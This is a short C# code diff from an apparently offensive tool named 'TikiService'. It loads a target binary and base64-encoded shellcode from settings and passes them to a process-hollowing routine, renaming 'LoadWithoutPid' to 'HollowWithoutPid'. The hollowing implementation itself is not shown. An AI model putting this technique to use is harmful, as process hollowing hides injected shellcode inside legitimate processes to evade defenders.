@@ -21,8 +21,8 @@ namespace TikiService
                 string binary = settings["Binary"];
                 byte[] shellcode = Convert.FromBase64String(settings["Shellcode"]);
 
-                var ldr = new Hollower();
-                ldr.LoadWithoutPid(binary, shellcode);
+                var hollower = new Hollower();
+                hollower.HollowWithoutPid(binary, shellcode);
             }
             catch
             {
